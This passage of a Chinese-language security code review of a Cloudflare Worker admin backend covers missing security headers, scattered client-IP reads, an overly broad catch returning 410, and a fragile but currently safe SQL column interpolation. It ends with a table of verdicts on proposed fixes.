- 建议修法:补一个轻量中间件给全部响应(至少 `/admin/*` 和 API 响应)加 `X-Content-Type-Options: nosniff`、`X-Frame-Options: DENY`(或 `Content-Security-Policy: frame-ancestors 'none'`)、以及一条基础 `Content-Security-Policy`(`script-src 'self'` 起步)。HSTS 通常在 Cloudflare 区域(dashboard)层面配置而非代码层,建议加进 `2026-08-31-website-admin.plan.md` 的「Phase C 上线切换清单」核对项,而不是在 worker 代码里配。

**M-4:5 处裸读 `cf-connecting-ip`,无共享出口(§B 已详述,单独列出以确保不被当成"只是 IPv6 归一"的子项漏看)**
- 位置:`worker/src/auth.ts:60`、`worker/src/index.ts:85`、`worker/src/geo.ts:146`、`worker/src/geo.ts:168`、`worker/src/ingest.ts:30`。这是一个独立于 §B 是否落地都存在的"单一事实源未收口到全部消费面"问题:哪怕不做 IPv6 归一,这 5 处分散的写法本身也是后续任何一次"改限速逻辑"都容易漏改其中一处的隐患。

### LOW

**L-1:`§A` 自定义头中间件若按路径前缀挂载而不按方法过滤,会误伤只读轮询**(已在 §A Q2/Q4 详述,此处仅登记严重度)。

**L-2:`authRoutes.post('/setup')` 用一个不区分错误类型的 `catch` 把 INSERT 失败统一映射成 410**
- 位置:`worker/src/auth.ts:173-181`
  ```
  try {
    await c.env.DB.prepare('INSERT INTO auth_account …').bind(hash, salt, now).run();
  } catch {
    // 并发重复 setup 撞主键(CHECK id=1):安全不变量仍成立,回干净的 410 而非 500(LOW)
    return c.json({ error: 'already-initialized' }, 410);
  }
  ```
- 现象:注释里说明这是为了处理"并发 setup 撞主键"的预期情况,但这个 `catch` 没有区分"确实是主键冲突"还是"D1 连接失败等其它错误"——后一种情况下返回 410("已初始化")会误导客户端(实际系统可能根本没有初始化成功),排障时容易被这条错误信息带偏。
- 建议修法:低优先级,可以先判断 `isInitialized` 是否确实为 true 再决定回 410 还是把原始错误继续抛给 M-2 建议的全局 `onError`。

**L-3:`dashRoutes` 的 `group()` 辅助函数用字符串插值拼列名到 SQL 里**
- 位置:`worker/src/dash.ts` 的 `dims` 分组(`const group = async (col: string) => (…).prepare(\`SELECT ${col} AS k, … GROUP BY ${col} …\`))`,调用点固定传入字面量 `'ref_class'`/`'country'`/`'device'`。
- 现象:当前不可利用——`col` 从未来自 `c.req.query()` 或任何请求输入,三个调用点都是硬编码字符串。列为 LOW 是因为这是一个"正确但脆弱"的模式:如果以后有人为了扩展维度而把 `col` 改成从请求参数读取(哪怕只是加一个前端下拉选维度的小功能),这行代码会在不知不觉中变成 SQL 注入点。
- 建议修法:如果预期这个分组维度未来可能开放给前端选择,现在就加一个 `const ALLOWED_COLS = new Set(['ref_class','country','device'])` 的白名单断言;如果永远只有这三个硬编码维度,加一行注释说明"col 只能是编译期常量,不接受任何外部输入"即可,防止后来者顺手把它改成动态的。

---

## 附:与提案证伪五问的落款对照

| 项 | 判定 |
|---|---|
| §A CSRF | 需要修正(方法过滤 + 现状表补全 + Phase C 子域前提须写清楚;成本比自评低) |
| §B IPv6 归一 | 可以照做(5 处读取点须收口成 1 个共享函数;登录限速这一路的可用性权衡须单独写明) |
| §C 审计覆盖测试 | 可以照做(仅一条测试环境搭建细节需要注意:bypass.issue 依赖 BYPASS_SECRET 通过 fail-closed 闸) |
| §D schema 版本漂移拒绝 | 不可行(按字面机制;无配套迁移会当场瘫痪全部配置读写路径,不止回滚)——应改为 PRD 原意的"物化脚本 vs worker 端代码版本比对",与存量数据无关 |
